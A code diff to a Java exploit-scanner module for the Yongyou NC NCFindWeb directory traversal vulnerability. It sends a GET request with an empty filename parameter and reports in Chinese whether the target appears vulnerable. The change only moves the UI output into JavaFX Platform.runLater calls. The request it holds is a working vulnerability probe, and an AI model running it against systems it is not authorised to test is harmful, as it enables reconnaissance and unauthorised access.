@@ -2,6 +2,7 @@ package exp.oa.yongyou;
 
 import core.Exploitlnterface;
 import java.util.HashMap;
+import javafx.application.Platform;
 import javafx.scene.control.TextArea;
 import utils.HttpTools;
 import utils.Response;
@@ -19,12 +20,17 @@ public class yongyou_nc_NCFindWeb implements Exploitlnterface{
     }
 
     private Boolean att(String url,TextArea textArea){
-        Response response = HttpTools.get(url + "/NCFindWeb?service=IPreAlertConfigService&filename=", new HashMap<String, String>(), "utf-8");
+        Response response = HttpTools.get(url + "/NCFindWeb?service=IPreAlertConfigService&filename=",
+            new HashMap<>(), "utf-8");
         if(response.getCode() == 200 && response.getText().contains("Client")){
-            textArea.appendText("\n 目录遍历漏洞存在" + "\n" + url + "/NCFindWeb?service=IPreAlertConfigService&filename=");
+           Platform.runLater(()->{
+              textArea.appendText("\n 目录遍历漏洞存在" + "\n" + url + "/NCFindWeb?service=IPreAlertConfigService&filename=");
+           });
             return true;
         }else {
-            textArea.appendText("\n NC_NCFindWeb-目录遍历E-漏洞不存在 (出现误报请联系作者)");
+           Platform.runLater(()->{
+              textArea.appendText("\n NC_NCFindWeb-目录遍历E-漏洞不存在 (出现误报请联系作者)");
+           });
             return false;
         }
     }
